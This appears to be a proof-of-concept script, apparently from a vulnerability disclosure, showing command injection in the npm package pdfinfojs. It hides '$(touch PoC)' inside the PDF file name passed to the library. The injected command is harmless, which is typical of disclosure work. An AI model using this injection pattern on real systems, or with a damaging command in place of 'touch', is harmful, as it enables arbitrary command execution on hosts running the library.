var pdfinfo = require('pdfinfojs'),
    pdf = new pdfinfo('homework1.pdf"$(touch PoC)"'); // Malicious payload

pdf.getInfo(function (err, info, params) {
  if (err) {
    console.error(err.stack);
  } else {
    console.log(info); //info is an object
    console.log(params); // commandline params passed to pdfinfo cmd
  }
});